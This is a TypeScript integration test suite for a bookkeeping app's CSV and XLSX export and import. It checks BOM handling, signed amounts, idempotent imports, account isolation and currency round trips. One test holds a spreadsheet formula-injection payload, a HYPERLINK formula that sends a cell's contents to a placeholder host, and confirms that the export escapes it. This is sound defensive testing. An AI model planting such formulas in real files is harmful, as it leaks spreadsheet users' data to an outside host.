import { EXPORT_COLUMNS, csvRow, parseCsv } from "@libellum/shared";
import { afterAll, beforeEach, describe, expect, it } from "vitest";

import { makeApp, prisma, resetDatabase, signUp, type LedgerMeta } from "./support.js";

/**
 * Export and import.
 *
 * These are integration tests against a real PostgreSQL, because almost every
 * rule being tested lives in the database: the unique constraint that scopes
 * de-duplication to a book, the CHECK constraints that make an untraceable
 * reference unwritable, and the transaction that makes an import all-or-nothing.
 */

const app = makeApp();

afterAll(async () => {
  await app.close();
  await prisma.$disconnect();
});

beforeEach(async () => {
  await resetDatabase();
});

interface Fixture {
  readonly cookie: string;
  readonly ledger: LedgerMeta;
}

async function fixture(username: string): Promise<Fixture> {
  const cookie = await signUp(app, username);
  const response = await app.inject({ method: "GET", url: "/api/v1/ledger", headers: { cookie } });
  return { cookie, ledger: response.json() as LedgerMeta };
}

interface EntryInput {
  readonly amountCents: number;
  readonly kind?: "expense" | "income";
  readonly currency?: string;
  readonly categoryName?: string;
  readonly note?: string | null;
  readonly date?: string;
}

async function addEntry(fixture: Fixture, input: EntryInput): Promise<void> {
  const category = fixture.ledger.categories.find(
    (item) => item.kind === (input.kind ?? "expense") && item.name === (input.categoryName ?? "餐饮"),
  );
  const date = input.date ?? "2026-10-10";

  const response = await app.inject({
    method: "POST",
    url: "/api/v1/transactions",
    headers: { cookie: fixture.cookie },
    payload: {
      id: crypto.randomUUID(),
      idempotencyKey: crypto.randomUUID(),
      kind: input.kind ?? "expense",
      amountCents: input.amountCents,
      currency: input.currency ?? "CNY",
      categoryId: category?.id ?? null,
      paymentMethodId: null,
      occurredAt: `${date}T12:30:00+08:00`,
      occurredLocalDate: date,
      occurredTz: "Asia/Shanghai",
      note: input.note ?? null,
      tagIds: [],
    },
  });

  expect(response.statusCode, response.body).toBe(201);
}

async function exportCsv(fixture: Fixture, query = ""): Promise<{ status: number; body: string; headers: Record<string, unknown> }> {
  const response = await app.inject({
    method: "GET",
    url: `/api/v1/export${query}`,
    headers: { cookie: fixture.cookie },
  });

  return { status: response.statusCode, body: response.body, headers: response.headers };
}

async function importCsv(
  fixture: Fixture,
  csv: string,
): Promise<{ status: number; body: Record<string, unknown> }> {
  const boundary = "----libellumtest";
  const payload = Buffer.concat([
    Buffer.from(`--${boundary}\r\n`),
    Buffer.from('Content-Disposition: form-data; name="fileId"\r\n\r\n'),
    Buffer.from(`${crypto.randomUUID()}\r\n`),
    Buffer.from(`--${boundary}\r\n`),
    Buffer.from('Content-Disposition: form-data; name="file"; filename="a.csv"\r\n'),
    Buffer.from("Content-Type: text/csv\r\n\r\n"),
    Buffer.from(csv, "utf8"),
    Buffer.from(`\r\n--${boundary}--\r\n`),
  ]);

  const response = await app.inject({
    method: "POST",
    url: "/api/v1/import",
    headers: { cookie: fixture.cookie, "content-type": `multipart/form-data; boundary=${boundary}` },
    payload,
  });

  return { status: response.statusCode, body: response.json() as Record<string, unknown> };
}

describe("GET /export", () => {
  it("writes a UTF-8 BOM, without which Excel shows mojibake", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 3850 });

    const { status, body } = await exportCsv(user);

    expect(status).toBe(200);
    expect(body.startsWith("\uFEFF")).toBe(true);
  });

  it("carries the Chinese headings in the documented order", async () => {
    const user = await fixture("exporter");
    const { body } = await exportCsv(user);

    const headers = parseCsv(body)[0];
    expect(headers).toEqual(EXPORT_COLUMNS.map((column) => column.header));
  });

  it("writes amounts as numbers, so a spreadsheet can sum them", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 3850 });

    const [, row] = parseCsv((await exportCsv(user)).body);
    const amount = row?.[4];

    expect(amount).toBe("-38.5");
    expect(Number(amount)).toBe(-38.5);
  });

  it("makes an expense negative and income positive, so SUM is a balance", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 1000 });
    await addEntry(user, { amountCents: 250000, kind: "income", categoryName: "工资" });

    const rows = parseCsv((await exportCsv(user)).body).slice(1);
    const amounts = rows.map((row) => Number(row[4]));

    expect(amounts).toContain(-10);
    expect(amounts).toContain(2500);
    expect(amounts.reduce((sum, value) => sum + value, 0)).toBe(2490);
  });

  it("refuses to let a note become a formula", async () => {
    const user = await fixture("exporter");
    const attack = '=HYPERLINK("http://example.invalid/?x="&A1,"点我")';
    await addEntry(user, { amountCents: 100, note: attack });

    const raw = (await exportCsv(user)).body;

    // The cell text must be preceded by an apostrophe, and the raw text must
    // never appear in a position a spreadsheet would evaluate.
    expect(raw).toContain(`'${attack.replace(/"/g, '""')}`.slice(0, 12));
    expect(parseCsv(raw)[1]?.[8]).toBe(`'${attack}`);
  });

  it("names the export with an Out- reference and exposes it to the browser", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 100 });

    const { headers } = await exportCsv(user);
    const fileRef = headers["x-libellum-file-ref"];

    expect(typeof fileRef).toBe("string");
    expect(String(fileRef)).toMatch(/^Out-\d{8}-\d{6}-[0-9a-f]{4}$/);
    expect(headers["x-libellum-row-count"]).toBe("1");
  });

  it("puts the same Out- reference on every row", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 100 });
    await addEntry(user, { amountCents: 200 });

    const { body, headers } = await exportCsv(user);
    const rows = parseCsv(body).slice(1);

    for (const row of rows) {
      expect(row[13]).toBe(headers["x-libellum-file-ref"]);
    }
  });

  it("records the export as metadata only", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 3850, note: "这一句不应该进审计表" });

    const { headers } = await exportCsv(user);
    const logs = await prisma.exportLog.findMany();

    expect(logs).toHaveLength(1);
    expect(logs[0]?.fileRef).toBe(headers["x-libellum-file-ref"]);
    expect(logs[0]?.rowCount).toBe(1);
    expect(logs[0]?.format).toBe("csv");
    // Nothing about the contents is stored anywhere in the row.
    expect(JSON.stringify(logs[0])).not.toContain("这一句不应该进审计表");
  });

  it("filters by month", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 100, date: "2026-10-10" });
    await addEntry(user, { amountCents: 200, date: "2026-09-10" });

    const rows = parseCsv((await exportCsv(user, "?monthFrom=2026-09&monthTo=2026-09")).body).slice(1);

    expect(rows).toHaveLength(1);
    expect(rows[0]?.[0]).toBe("2026-09-10");
  });

  it("offers a template with headings but no data", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 100 });

    const { body } = await exportCsv(user, "?template=true");
    const table = parseCsv(body);

    expect(table).toHaveLength(1);
    expect(table[0]).not.toContain("导出编号");
  });

  it("writes an XLSX that is a real archive", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 3850 });

    const response = await app.inject({
      method: "GET",
      url: "/api/v1/export?format=xlsx",
      headers: { cookie: user.cookie },
    });

    expect(response.statusCode).toBe(200);
    expect(response.headers["content-type"]).toContain("spreadsheetml");
    // A ZIP begins with the local file header signature.
    expect(response.rawPayload.readUInt32LE(0)).toBe(0x04034b50);
  });

  it("never returns another account's rows", async () => {
    const mine = await fixture("mine");
    const theirs = await fixture("theirs");
    await addEntry(mine, { amountCents: 111, note: "我的" });
    await addEntry(theirs, { amountCents: 222, note: "别人的" });

    const body = (await exportCsv(mine)).body;

    expect(body).toContain("我的");
    expect(body).not.toContain("别人的");
  });

  it("requires a session", async () => {
    const response = await app.inject({ method: "GET", url: "/api/v1/export" });
    expect(response.statusCode).toBe(401);
  });

  it("lists what has left the book", async () => {
    const user = await fixture("exporter");
    await addEntry(user, { amountCents: 100 });
    await exportCsv(user);

    const response = await app.inject({
      method: "GET",
      url: "/api/v1/export-log",
      headers: { cookie: user.cookie },
    });

    expect(response.statusCode).toBe(200);
    const body = response.json() as { entries: { fileRef: string; rowCount: number }[] };
    expect(body.entries).toHaveLength(1);
    expect(body.entries[0]?.rowCount).toBe(1);
  });
});

describe("POST /import", () => {
  const HEADERS = EXPORT_COLUMNS.map((column) => column.header);

  function file(rows: (string | number)[][]): string {
    return `\uFEFF${[csvRow(HEADERS), ...rows.map((row) => csvRow(row))].join("\r\n")}\r\n`;
  }

  function row(overrides: Partial<Record<number, string | number>> = {}): (string | number)[] {
    const base: (string | number)[] = [
      "2026-10-10",
      "12:30",
      "Asia/Shanghai",
      "支出",
      -38.5,
      "CNY",
      "餐饮",
      "",
      "午饭",
      "",
      "2026-10-10 12:31",
      crypto.randomUUID(),
      "",
      "",
    ];
    for (const [index, value] of Object.entries(overrides)) {
      base[Number(index)] = value as string | number;
    }
    return base;
  }

  it("imports a well-formed file", async () => {
    const user = await fixture("importer");
    const result = await importCsv(user, file([row(), row({ 0: "2026-10-09" })]));

    expect(result.status).toBe(200);
    expect(result.body["ok"]).toBe(true);
    expect(result.body["importedCount"]).toBe(2);
    expect(result.body["skippedCount"]).toBe(0);
    expect(String(result.body["fileRef"])).toMatch(/^In-\d{8}-\d{6}-[0-9a-f]{4}$/);

    const stored = await prisma.transaction.findMany({ include: { tags: true } });
    expect(stored).toHaveLength(2);
    expect(stored[0]?.importRef).toBe(result.body["fileRef"]);
    expect(stored[0]?.amountCents).toBe(3850n);
  });

  it("records the import with its counts", async () => {
    const user = await fixture("importer");
    await importCsv(user, file([row(), row({ 0: "2026-10-09" })]));

    const logs = await prisma.importLog.findMany();
    expect(logs).toHaveLength(1);
    expect(logs[0]?.rowCount).toBe(2);
    expect(logs[0]?.importedCount).toBe(2);
    expect(logs[0]?.skippedCount).toBe(0);
    expect(logs[0]?.sourceFingerprint).toMatch(/^[0-9a-f]{64}$/);
  });

  it("writes nothing at all when one row is wrong, and says which line", async () => {
    const user = await fixture("importer");
    const result = await importCsv(user, file([row(), row({ 4: "不是数字" }), row({ 0: "2026-13-01" })]));

    expect(result.body["ok"]).toBe(false);
    expect(result.body["importedCount"]).toBe(0);

    const errors = result.body["errors"] as { line: number; column: string }[];
    expect(errors).toHaveLength(2);
    expect(errors.map((error) => error.line)).toEqual([3, 4]);

    // The important half: nothing was written.
    expect(await prisma.transaction.count()).toBe(0);
    expect(await prisma.importLog.count()).toBe(0);
  });

  it("names the column and the reason", async () => {
    const user = await fixture("importer");
    const result = await importCsv(user, file([row({ 5: "XYZ" })]));

    const errors = result.body["errors"] as { line: number; column: string; message: string }[];
    expect(errors[0]?.column).toBe("币种");
    expect(errors[0]?.message).toContain("XYZ");
  });

  it("refuses a category that does not exist rather than inventing one", async () => {
    const user = await fixture("importer");
    const result = await importCsv(user, file([row({ 6: "不存在的分类" })]));

    expect(result.body["ok"]).toBe(false);
    expect(await prisma.transaction.count()).toBe(0);
  });

  it("is idempotent: the same file twice changes nothing the second time", async () => {
    const user = await fixture("importer");
    const csv = file([row(), row({ 0: "2026-10-09" })]);

    const first = await importCsv(user, csv);
    const second = await importCsv(user, csv);

    expect(first.body["importedCount"]).toBe(2);
    expect(second.body["importedCount"]).toBe(2); // reported from the first run
    expect(second.body["fileRef"]).toBe(first.body["fileRef"]);
    expect(await prisma.transaction.count()).toBe(2);
    expect(await prisma.importLog.count()).toBe(1);
  });

  it("skips rows already present, by their own id", async () => {
    const user = await fixture("importer");
    const shared = crypto.randomUUID();

    const first = await importCsv(user, file([row({ 11: shared })]));
    expect(first.body["importedCount"]).toBe(1);

    // A different file — different bytes, so not caught by the fingerprint —
    // that nevertheless carries a row we already have.
    const second = await importCsv(user, file([row({ 11: shared, 9: "改了备注" })]));

    expect(second.body["importedCount"]).toBe(0);
    expect(second.body["skippedCount"]).toBe(1);
    expect(second.body["skippedLines"]).toEqual([2]);
    expect(await prisma.transaction.count()).toBe(1);
  });

  it("does not duplicate a row twice inside one file", async () => {
    const user = await fixture("importer");
    const shared = crypto.randomUUID();
    const result = await importCsv(user, file([row({ 11: shared }), row({ 11: shared, 0: "2026-10-09" })]));

    expect(result.body["importedCount"]).toBe(1);
    expect(result.body["skippedCount"]).toBe(1);
  });

  it("imports the same file into a second account normally", async () => {
    const first = await fixture("first");
    const second = await fixture("second");
    const csv = file([row()]);

    await importCsv(first, csv);
    const result = await importCsv(second, csv);

    // De-duplication is per book: a shared file is not "already imported"
    // somewhere else, and refusing it would be wrong.
    expect(result.body["importedCount"]).toBe(1);
    expect(await prisma.transaction.count()).toBe(2);
  });

  it("accepts a file with no traceability columns, and says nothing was traceable", async () => {
    const user = await fixture("importer");
    const plain = `\uFEFF${csvRow(["日期", "金额", "备注"])}\r\n${csvRow(["2026-10-10", "-38.5", "别处来的"])}\r\n`;

    const result = await importCsv(user, plain);

    expect(result.body["ok"]).toBe(true);
    expect(result.body["importedCount"]).toBe(1);

    const stored = await prisma.transaction.findFirst();
    expect(stored?.sourceRef).toBeNull();
    expect(stored?.importRef).toMatch(/^In-/);
  });

  it("recognises one of our own exports coming home", async () => {
    const user = await fixture("importer");
    await addEntry(user, { amountCents: 3850 });

    const exported = await exportCsv(user);
    const sourceRef = exported.headers["x-libellum-file-ref"];

    const result = await importCsv(user, exported.body);

    expect(result.body["exportedFileRef"]).toBe(sourceRef);
    expect(result.body["importedCount"]).toBe(0);
    expect(result.body["skippedCount"]).toBe(1);
  });

  it("undoes the formula escape on the way back in", async () => {
    const user = await fixture("importer");
    const attack = "=1+1";
    await addEntry(user, { amountCents: 100, note: attack });

    await importCsv(user, (await exportCsv(user)).body);

    // Nothing new was written, so read the original row back.
    const stored = await prisma.transaction.findFirst();
    expect(stored?.note).toBe(attack);
  });

  it("creates tags the file mentions", async () => {
    const user = await fixture("importer");
    const result = await importCsv(user, file([row({ 9: "出差 可报销" })]));

    expect(result.body["ok"]).toBe(true);
    expect((await prisma.tag.findMany()).map((tag) => tag.name).sort()).toEqual(["出差", "可报销"]);
  });

  it("requires a session", async () => {
    const response = await app.inject({ method: "POST", url: "/api/v1/import" });
    expect(response.statusCode).toBe(401);
  });
});

describe("a full round trip", () => {
  it("exports, imports into another account, and preserves every amount", async () => {
    const source = await fixture("source");
    await addEntry(source, { amountCents: 3850, note: "午饭, 和同事" });
    await addEntry(source, { amountCents: 250000, kind: "income", categoryName: "工资" });
    // ¥800. The yen has no minor unit, so the stored value is 800 — not 80000.
    // A round trip that used a fixed hundred would make this 8.
    await addEntry(source, { amountCents: 800, currency: "JPY", categoryName: "交通" });

    const exported = (await exportCsv(source)).body;

    // The file must carry the amount a person would recognise.
    const jpyRow = parseCsv(exported)
      .slice(1)
      .find((row) => row[5] === "JPY");
    expect(jpyRow?.[4]).toBe("-800");

    const destination = await fixture("destination");
    const result = await importCsv(destination, exported);

    expect(result.body["ok"], JSON.stringify(result.body)).toBe(true);
    expect(result.body["importedCount"]).toBe(3);

    const rows = await prisma.transaction.findMany({
      where: { user: { username: "destination" } },
      orderBy: { amountCents: "asc" },
    });

    expect(rows.map((entry) => entry.amountCents)).toEqual([800n, 3850n, 250000n]);
    expect(rows.map((entry) => entry.currency).sort()).toEqual(["CNY", "CNY", "JPY"]);
    // A multi-byte note with a comma in it survives the trip.
    expect(rows.some((entry) => entry.note === "午饭, 和同事")).toBe(true);
  });
});
